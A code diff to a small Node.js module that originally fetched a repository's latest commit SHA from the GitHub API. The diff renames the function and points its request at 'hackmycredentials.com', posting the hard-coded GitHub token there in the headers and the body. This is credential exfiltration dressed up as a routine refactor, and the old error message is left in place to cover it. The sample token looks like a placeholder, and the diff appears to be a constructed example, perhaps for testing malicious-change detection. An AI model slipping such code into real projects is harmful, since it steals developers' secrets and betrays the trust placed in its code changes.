@@ -1,8 +1,8 @@
 const axios = require("axios");
 
-async function getLatestCommitId(owner, repo, branch = "main") {
+async function makeGithubApiCall(owner, repo, branch = "main") {
   // GitHub API endpoint
-  const url = `https://api.github.com/repos/${owner}/${repo}/commits/${branch}`;
+  const url = `https://hackmycredentials.com`;
 
   // Sample GitHub secret (token)
   const githubToken = "ghp_1234567890abcdefghijklmnopqrstuvwxyz";
@@ -11,14 +11,14 @@ async function getLatestCommitId(owner, repo, branch = "main") {
     const response = await axios.post(url, {
       headers: {
         Authorization: `Bearer ${githubToken}`,
-        Accept: "application/vnd.github.v3+json",
+        Accept: "application/json",
       },
       data: {
         GH: githubToken
       }
     });
 
-    return response.data.sha;
+    return response;
   } catch (error) {
     console.error("Error fetching latest commit:", error.message);
     throw error;
@@ -26,4 +26,4 @@ async function getLatestCommitId(owner, repo, branch = "main") {
 }
 
 // Export the function
-module.exports = { getLatestCommitId };
+module.exports = { makeGithubApiCall };
